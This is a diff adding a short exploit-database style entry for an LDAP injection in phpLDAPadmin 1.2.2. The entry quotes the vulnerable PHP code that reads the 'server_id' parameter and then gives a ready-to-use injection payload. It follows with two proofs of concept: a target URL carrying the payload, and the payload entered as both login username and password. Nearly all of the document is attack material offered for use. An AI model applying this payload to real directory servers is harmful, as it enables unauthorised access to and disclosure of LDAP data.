@@ -1,0 +1,27 @@
+# Exploit Title: phpLDAPadmin 1.2.2 - 'server_id' LDAP Injection (Username)    
+# Google Dork:N/A
+# Date: 21.06.2018
+# Exploit Author: Berk Dusunur
+# Vendor Homepage: http://phpldapadmin.sourceforge.net
+# Software Link: http://phpldapadmin.sourceforge.net
+# Version: 1.2.2
+# Tested on: Pardus / Debian Web Server
+# CVE : N/A
+
+#Vulnerable Code
+$server =
+$_SESSION[APPCONFIG]->getServer(get_request('server_id','REQUEST'));
+    if (count($server->untested()))
+        system_message(array(
+
+#Payload
+
+!(()&&!|*|*|
+
+#PoC 1
+
+http://target/phpldapadmin/cmd.php?cmd=login_form&server_id=1!(()&&!|*|*|&redirect=true
+
+#PoC 2
+
+login panel username use !(()&&!|*|*| password !(()&&!|*|*|
